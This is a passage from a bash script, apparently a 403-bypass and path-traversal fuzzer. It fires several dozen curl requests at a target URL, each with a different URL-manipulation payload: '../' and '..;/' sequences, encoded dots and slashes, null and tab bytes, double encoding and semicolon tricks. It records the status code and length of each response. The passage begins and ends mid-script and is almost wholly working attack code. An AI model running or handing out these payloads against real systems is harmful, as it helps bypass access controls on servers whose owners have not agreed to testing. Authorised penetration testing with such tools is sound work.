code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;/..///" -H "$user_agent")
print
echo -n "Payload [ ;/../;/ ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;/../;/" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;/../;/" -H "$user_agent")
print
echo -n "Payload [ ;/../;/../ ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;/../;/../" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;/../;/../" -H "$user_agent")
print
echo -n "Payload [ ;/..; ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;/..;" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;/..;" -H "$user_agent")
print
echo -n "Payload [ ;/.;. ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;/.;." -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;/.;." -H "$user_agent")
print
echo -n "Payload [ ;//%2f../ ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;//%2f../" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;//%2f../" -H "$user_agent")
print
echo -n "Payload [ ;//.. ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;//.." -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;//.." -H "$user_agent")
print
echo -n "Payload [ ;//../../ ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;//../../" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;//../../" -H "$user_agent")
print
echo -n "Payload [ ;///.. ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;///.." -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;///.." -H "$user_agent")
print
echo -n "Payload [ ;///../ ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;///../" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;///../" -H "$user_agent")
print
echo -n "Payload [ ;///..// ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;///..//" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;///..//" -H "$user_agent")
print
echo -n "Payload [ ;x ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;x" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;x" -H "$user_agent")
print
echo -n "Payload [ ;x/ ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;x/" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;x/" -H "$user_agent")
print
echo -n "Payload [ ;x; ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;x;" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;x;" -H "$user_agent")
print
echo -n "Payload [ & ]: "
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL&" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL&" -H "$user_agent")
print
echo -n "Payload [ % ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL%" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL%" -H "$user_agent")
print
echo -n "Payload [ %09 ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL%09" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL%09" -H "$user_agent")
print
echo -n "Payload [ ../ ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL../" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL../" -H "$user_agent")
print
echo -n "Payload [ ../%2f ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL..%2f" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL..%2f" -H "$user_agent")
print
echo -n "Payload [ .././ ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL.././" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL.././" -H "$user_agent")
print
echo -n "Payload [ ..%00/ ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL..%00/" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL..%00/" -H "$user_agent")
print
echo -n "Payload [ ..%0d/ ]"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL..%0d/" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL..%0d/" -H "$user_agent")
print
echo -n "Payload [ ..%5c ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL..%5c" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL..%5c" -H "$user_agent")
print
echo -n "Payload [ ..\ ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL..\\" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL..\\" -H "$user_agent")
print
echo -n "Payload [ ..%ff/ ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL..%ff" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL..%ff" -H "$user_agent")
print
echo -n "Payload [ %2e%2e%2f ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL%2e%2e%2f" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL%2e%2e%2f" -H "$user_agent")
print
echo -n "Payload [ .%2e/ ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL.%2e/" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL.%2e/" -H "$user_agent")
print
echo -n "Payload [ %3f ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL%3f" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL%3f" -H "$user_agent")
print
echo -n "Payload [ %26 ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL%26" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL%26" -H "$user_agent")
print
echo -n "Payload [ %23 ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL%23" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL%23" -H "$user_agent")
print
echo -n "Payload [ %2e ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL%2e" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL%2e" -H "$user_agent")
print
echo -n "Payload [ /. ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/." -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/." -H "$user_agent")
print
echo -n "Payload [ ? ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL?" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL?" -H "$user_agent")
print
echo -n "Payload [ ?? ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL??" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL??" -H "$user_agent")
print
echo -n "Payload [ ??? ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL???" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL???" -H "$user_agent")
print
echo -n "Payload [ // ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL//" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL//" -H "$user_agent")
print
echo -n "Payload [ /./ ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/./" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/./" -H "$user_agent")
print
echo -n "Payload [ .//./ ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL.//./" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL.//./" -H "$user_agent")
print
echo -n "Payload [ //?anything ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL//?anything" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL//?anything" -H "$user_agent")
print
echo -n "Payload [ # ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL#" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL#" -H "$user_agent")
print
echo -n "Payload [ / ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/" -H "$user_agent")
print
echo -n "Payload [ /.randomstring ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/.randomstring" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/.randomstring" -H "$user_agent")
print
echo -n "Payload [ ..;/ ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL..;/" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL..;/" -H "$user_agent")
print
echo -n "Payload [ .html ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL.html" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL.html" -H "$user_agent")
print
echo -n "Payload [ %20/ ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL%20/" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL%20/" -H "$user_agent")
print
echo -n "Payload [ %20$PAT%20/ ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/%20$PAT%20/" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/%20$PAT%20/" -H "$user_agent")
print
echo -n "Payload [ .json ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL.json" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL.json" -H "$user_agent")
print
echo -n "Payload [ \..\.\ ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL\..\.\\" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL\..\.\\" -H "$user_agent")
print
echo -n "Payload [ /* ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/*" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/*" -H "$user_agent")
print
echo -n "Payload [ ./. ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL./." -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL./." -H "$user_agent")
print
echo -n "Payload [ /*/ ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/*/" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/*/" -H "$user_agent")
print
echo -n "Payload [ /..;/ ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/..;/" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/..;/" -H "$user_agent")
print
echo -n "Payload [%2e/$PAT ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/%2e/$PAT" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/%2e/$PAT" -H "$user_agent")
print
echo -n "Payload [ /%2e/ ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/%2e/" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/%2e/" -H "$user_agent")
print
echo -n "Payload [ //. ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL//." -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL//." -H "$user_agent")
print
echo -n "Payload [ //// ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL////" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL////" -H "$user_agent")
print
echo -n "Payload [ /../ ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/../" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/../" -H "$user_agent")
print
echo -n "Payload [ ;$PAT/ ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/;$PAT/" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/;$PAT/" -H "$user_agent")
print


echo -e ${blue}"-----------------------------"${end}
echo -e ${cyan}"[+] URL Tricks Bypass prefix "${end}
echo -e ${blue}"-----------------------------"${end}

echo -n "Payload [ #? ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/%3F$PAT" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/%3F$PAT" -H "$user_agent")
print
echo -n "Payload [ %09 ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/%09$PAT" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/%09$PAT" -H "$user_agent")
print
echo -n "Payload [ %09%3b ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/%09%3b$PAT" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/%09%3b$PAT" -H "$user_agent")
print
echo -n "Payload [ %09.. ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/%09..$PAT" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/%09..$PAT" -H "$user_agent")
print
echo -n "Payload [ %09; ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/%09;$PAT" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/%09;$PAT" -H "$user_agent")
print
echo -n "Payload [ %20 ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/%20$PAT" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/%20$PAT" -H "$user_agent")
print
echo -n "Payload [ %23%3f ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/%23%3f$PAT" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/%23%3f$PAT" -H "$user_agent")
print
echo -n "Payload [ %252f%252f ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/%252f%252f$PAT" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/%252f%252f$PAT" -H "$user_agent")
print
echo -n "Payload [ %252f/ ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/%252f/$PAT" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/%252f/$PAT" -H "$user_agent")
print
echo -n "Payload [ %2e%2e ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/%2e%2e$PAT" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/%2e%2e$PAT" -H "$user_agent")
print
echo -n "Payload [ %2e%2e/ ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/%2e%2e/$PAT" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/%2e%2e/$PAT" -H "$user_agent")
print
echo -n "Payload [ %2f ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/%2f$PAT" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/%2f$PAT" -H "$user_agent")
print
echo -n "Payload [ %2f%20%23 ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/%2f%20%23$PAT" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/%2f%20%23$PAT" -H "$user_agent")
print
echo -n "Payload [ %2f%23 ]:"
FILENAME=$(date +%s%N).html
